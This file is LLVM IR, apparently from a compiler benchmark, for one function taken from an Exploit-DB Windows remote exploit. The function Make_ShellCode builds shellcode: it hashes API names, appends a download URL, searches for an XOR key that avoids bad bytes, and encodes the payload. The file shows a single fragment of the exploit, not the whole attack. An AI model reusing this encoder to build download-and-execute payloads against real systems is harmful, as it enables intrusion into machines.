; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1420.c_Make_ShellCode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1420.c_Make_ShellCode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ENC_KEY = common dso_local global i32 0, align 4
@functions = common dso_local global i8** null, align 8
@ShellCode = common dso_local global i64 0, align 8
@MAX_SC_LEN = common dso_local global i32 0, align 4
@SEARCH_STR = common dso_local global i32 0, align 4
@SEARCH_LEN = common dso_local global i64 0, align 8
@Sc_len = common dso_local global i32 0, align 4
@sc = common dso_local global i32* null, align 8
@DECODE_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [27 x i8] c"[+] Find XOR Byte: 0x%02X\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"[-] No xor byte found!\0D\0A\00", align 1
@SC_LEN_OFFSET = common dso_local global i64 0, align 8
@ENC_KEY_OFFSET = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"[+] download url:%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @Make_ShellCode(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [100 x i64], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %11 = load i32, i32* @ENC_KEY, align 4
  store i32 %11, i32* %4, align 4
  store i32 0, i32* %7, align 4
  br label %12

12:                                               ; preds = %33, %1
  %13 = load i8**, i8*** @functions, align 8
  %14 = load i32, i32* %7, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8*, i8** %13, i64 %15
  %17 = load i8*, i8** %16, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 0
  %19 = load i8, i8* %18, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %12
  br label %36

23:                                               ; preds = %12
  %24 = load i8**, i8*** @functions, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @GetHash(i8* %28)
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [100 x i64], [100 x i64]* %5, i64 0, i64 %31
  store i64 %29, i64* %32, align 8
  br label %33

33:                                               ; preds = %23
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %12

36:                                               ; preds = %22
  %37 = load i32, i32* %7, align 4
  %38 = mul nsw i32 %37, 4
  store i32 %38, i32* %6, align 4
  %39 = load i64, i64* @ShellCode, align 8
  %40 = inttoptr i64 %39 to i8*
  store i8* %40, i8** %3, align 8
  store i32 0, i32* %9, align 4
  br label %41

41:                                               ; preds = %56, %36
  %42 = load i32, i32* %9, align 4
  %43 = load i32, i32* @MAX_SC_LEN, align 4
  %44 = icmp slt i32 %42, %43
  br i1 %44, label %45, label %59

45:                                               ; preds = %41
  %46 = load i8*, i8** %3, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  %50 = load i32, i32* @SEARCH_STR, align 4
  %51 = load i64, i64* @SEARCH_LEN, align 8
  %52 = call i64 @memcmp(i8* %49, i32 %50, i64 %51)
  %53 = icmp eq i64 %52, 0
  br i1 %53, label %54, label %55

54:                                               ; preds = %45
  br label %59

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %55
  %57 = load i32, i32* %9, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %9, align 4
  br label %41

59:                                               ; preds = %54, %41
  %60 = load i32, i32* %9, align 4
  %61 = sext i32 %60 to i64
  %62 = load i64, i64* @SEARCH_LEN, align 8
  %63 = add nsw i64 %61, %62
  %64 = load i8*, i8** %3, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 %63
  store i8* %65, i8** %3, align 8
  store i32 0, i32* %9, align 4
  br label %66

66:                                               ; preds = %81, %59
  %67 = load i32, i32* %9, align 4
  %68 = load i32, i32* @MAX_SC_LEN, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %84

70:                                               ; preds = %66
  %71 = load i8*, i8** %3, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* @SEARCH_STR, align 4
  %76 = load i64, i64* @SEARCH_LEN, align 8
  %77 = call i64 @memcmp(i8* %74, i32 %75, i64 %76)
  %78 = icmp eq i64 %77, 0
  br i1 %78, label %79, label %80

79:                                               ; preds = %70
  br label %84

80:                                               ; preds = %70
  br label %81

81:                                               ; preds = %80
  %82 = load i32, i32* %9, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %9, align 4
  br label %66

84:                                               ; preds = %79, %66
  %85 = load i32, i32* %9, align 4
  store i32 %85, i32* @Sc_len, align 4
  %86 = load i32*, i32** @sc, align 8
  %87 = load i8*, i8** %3, align 8
  %88 = load i32, i32* @Sc_len, align 4
  %89 = call i32 (i32*, ...) @memcpy(i32* %86, i8* %87, i32 %88)
  %90 = load i32*, i32** @sc, align 8
  %91 = load i32, i32* @Sc_len, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i32, i32* %90, i64 %92
  %94 = getelementptr inbounds [100 x i64], [100 x i64]* %5, i64 0, i64 0
  %95 = bitcast i64* %94 to i8*
  %96 = load i32, i32* %6, align 4
  %97 = call i32 (i32*, ...) @memcpy(i32* %93, i8* %95, i32 %96)
  %98 = load i32, i32* %6, align 4
  %99 = load i32, i32* @Sc_len, align 4
  %100 = add i32 %99, %98
  store i32 %100, i32* @Sc_len, align 4
  %101 = load i32*, i32** @sc, align 8
  %102 = load i32, i32* @Sc_len, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  %105 = load i8*, i8** %2, align 8
  %106 = load i8*, i8** %2, align 8
  %107 = call i32 @strlen(i8* %106)
  %108 = add nsw i32 %107, 1
  %109 = call i32 (i32*, ...) @memcpy(i32* %104, i8* %105, i32 %108)
  %110 = load i8*, i8** %2, align 8
  %111 = call i32 @strlen(i8* %110)
  %112 = add nsw i32 %111, 1
  %113 = load i32, i32* @Sc_len, align 4
  %114 = add nsw i32 %113, %112
  store i32 %114, i32* @Sc_len, align 4
  store i32 255, i32* %7, align 4
  br label %115

115:                                              ; preds = %219, %84
  %116 = load i32, i32* %7, align 4
  %117 = icmp sgt i32 %116, 0
  br i1 %117, label %118, label %222

118:                                              ; preds = %115
  store i32 0, i32* %10, align 4
  %119 = load i32, i32* @DECODE_LEN, align 4
  store i32 %119, i32* %8, align 4
  br label %120

120:                                              ; preds = %191, %118
  %121 = load i32, i32* %8, align 4
  %122 = load i32, i32* @Sc_len, align 4
  %123 = icmp slt i32 %121, %122
  br i1 %123, label %124, label %194

124:                                              ; preds = %120
  %125 = load i32*, i32** @sc, align 8
  %126 = load i32, i32* %8, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i32, i32* %125, i64 %127
  %129 = load i32, i32* %128, align 4
  %130 = load i32, i32* %7, align 4
  %131 = xor i32 %129, %130
  %132 = icmp eq i32 %131, 38
  br i1 %132, label %187, label %133

133:                                              ; preds = %124
  %134 = load i32*, i32** @sc, align 8
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  %138 = load i32, i32* %137, align 4
  %139 = load i32, i32* %7, align 4
  %140 = xor i32 %138, %139
  %141 = icmp eq i32 %140, 61
  br i1 %141, label %187, label %142

142:                                              ; preds = %133
  %143 = load i32*, i32** @sc, align 8
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i32, i32* %143, i64 %145
  %147 = load i32, i32* %146, align 4
  %148 = load i32, i32* %7, align 4
  %149 = xor i32 %147, %148
  %150 = icmp eq i32 %149, 63
  br i1 %150, label %187, label %151

151:                                              ; preds = %142
  %152 = load i32*, i32** @sc, align 8
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = load i32, i32* %7, align 4
  %158 = xor i32 %156, %157
  %159 = icmp eq i32 %158, 64
  br i1 %159, label %187, label %160

160:                                              ; preds = %151
  %161 = load i32*, i32** @sc, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %7, align 4
  %167 = xor i32 %165, %166
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %187, label %169

169:                                              ; preds = %160
  %170 = load i32*, i32** @sc, align 8
  %171 = load i32, i32* %8, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i32, i32* %170, i64 %172
  %174 = load i32, i32* %173, align 4
  %175 = load i32, i32* %7, align 4
  %176 = xor i32 %174, %175
  %177 = icmp eq i32 %176, 13
  br i1 %177, label %187, label %178

178:                                              ; preds = %169
  %179 = load i32*, i32** @sc, align 8
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i32, i32* %179, i64 %181
  %183 = load i32, i32* %182, align 4
  %184 = load i32, i32* %7, align 4
  %185 = xor i32 %183, %184
  %186 = icmp eq i32 %185, 10
  br i1 %186, label %187, label %190

187:                                              ; preds = %178, %169, %160, %151, %142, %133, %124
  %188 = load i32, i32* %10, align 4
  %189 = add nsw i32 %188, 1
  store i32 %189, i32* %10, align 4
  br label %194

190:                                              ; preds = %178
  br label %191

191:                                              ; preds = %190
  %192 = load i32, i32* %8, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %8, align 4
  br label %120

194:                                              ; preds = %187, %120
  %195 = load i32, i32* %10, align 4
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %197, label %218

197:                                              ; preds = %194
  %198 = load i32, i32* %7, align 4
  store i32 %198, i32* %4, align 4
  %199 = load i32, i32* %7, align 4
  %200 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i32 %199)
  %201 = load i32, i32* @DECODE_LEN, align 4
  store i32 %201, i32* %8, align 4
  br label %202

202:                                              ; preds = %214, %197
  %203 = load i32, i32* %8, align 4
  %204 = load i32, i32* @Sc_len, align 4
  %205 = icmp slt i32 %203, %204
  br i1 %205, label %206, label %217

206:                                              ; preds = %202
  %207 = load i32, i32* %4, align 4
  %208 = load i32*, i32** @sc, align 8
  %209 = load i32, i32* %8, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = xor i32 %212, %207
  store i32 %213, i32* %211, align 4
  br label %214

214:                                              ; preds = %206
  %215 = load i32, i32* %8, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %8, align 4
  br label %202

217:                                              ; preds = %202
  br label %222

218:                                              ; preds = %194
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %7, align 4
  %221 = add nsw i32 %220, -1
  store i32 %221, i32* %7, align 4
  br label %115

222:                                              ; preds = %217, %115
  %223 = load i32, i32* %10, align 4
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %225, label %228

225:                                              ; preds = %222
  %226 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %227 = call i32 @exit(i32 -1) #3
  unreachable

228:                                              ; preds = %222
  %229 = load i32, i32* @Sc_len, align 4
  %230 = trunc i32 %229 to i8
  %231 = load i32*, i32** @sc, align 8
  %232 = load i64, i64* @SC_LEN_OFFSET, align 8
  %233 = getelementptr inbounds i32, i32* %231, i64 %232
  %234 = bitcast i32* %233 to i8*
  store i8 %230, i8* %234, align 1
  %235 = load i32, i32* %4, align 4
  %236 = trunc i32 %235 to i8
  %237 = load i32*, i32** @sc, align 8
  %238 = load i64, i64* @ENC_KEY_OFFSET, align 8
  %239 = getelementptr inbounds i32, i32* %237, i64 %238
  %240 = bitcast i32* %239 to i8*
  store i8 %236, i8* %240, align 1
  %241 = load i8*, i8** %2, align 8
  %242 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %241)
  ret void
}

declare dso_local i64 @GetHash(i8*) #1

declare dso_local i64 @memcmp(i8*, i32, i64) #1

declare dso_local i32 @memcpy(i32*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
